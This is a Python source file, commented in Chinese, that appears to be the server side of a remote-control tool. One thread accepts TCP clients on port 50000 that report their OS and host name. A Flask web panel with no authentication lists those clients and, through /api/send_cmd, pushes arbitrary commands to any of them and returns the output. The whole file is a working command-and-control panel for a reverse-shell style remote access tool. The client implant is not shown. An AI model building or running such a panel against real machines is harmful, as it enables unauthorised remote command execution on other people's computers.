from flask import Flask, render_template, request, jsonify
from socket import *
from threading import Thread, Lock
import uuid

app = Flask(__name__)

# 共享资源
clients = {}  # 格式: { id: {'socket': sock, 'addr': addr, 'os': os_type, 'name': name} }
lock = Lock()

# --- Socket 部分 ---

def socket_listener():
    """后台线程：监听客户端连接"""
    server = socket(AF_INET, SOCK_STREAM)
    server.bind(('0.0.0.0', 50000))
    server.listen(5)
    print("Socket 服务已启动，等待客户端连接...")

    while True:
        conn, addr = server.accept()
        try:
            # 接收客户端的第一条消息：系统信息 (Windows|HostName)
            data = conn.recv(1024).decode('utf-8')
            os_type, host_name = data.split('|')
            
            cid = str(uuid.uuid4())[:8] # 生成短ID
            with lock:
                clients[cid] = {
                    'socket': conn,
                    'addr': addr,
                    'os': os_type,
                    'name': host_name
                }
            print(f"新客户端接入: {host_name} ({os_type}) ID: {cid}")
        except:
            conn.close()

# --- Flask Web 路由部分 ---

@app.route('/')
def index():
    """主页面"""
    return render_template('index.html')

@app.route('/api/clients', methods=['GET'])
def list_clients():
    """获取在线客户端列表"""
    client_list = []
    with lock:
        for cid, info in clients.items():
            client_list.append({
                'id': cid,
                'addr': f"{info['addr'][0]}:{info['addr'][1]}",
                'os': info['os'],
                'name': info['name']
            })
    return jsonify(client_list)

@app.route('/api/send_cmd', methods=['POST'])
def send_cmd():
    """发送命令并获取结果"""
    data = request.json
    cid = data.get('id')
    cmd = data.get('cmd')

    if cid not in clients:
        return jsonify({'status': 'error', 'msg': '客户端已离线'})

    try:
        sock = clients[cid]['socket']
        sock.send(cmd.encode('utf-8'))
        # 设置超时，防止一直阻塞 Web 响应
        sock.settimeout(10) 
        response = sock.recv(8192).decode('utf-8', errors='ignore')
        return jsonify({'status': 'success', 'output': response})
    except Exception as e:
        with lock:
            if cid in clients: del clients[cid]
        return jsonify({'status': 'error', 'msg': f"通信失败: {e}"})

if __name__ == '__main__':
    # 启动 Socket 监听线程
    t = Thread(target=socket_listener, daemon=True)
    t.start()
    # 启动 Web 服务
    app.run(host='0.0.0.0', port=8080, debug=False)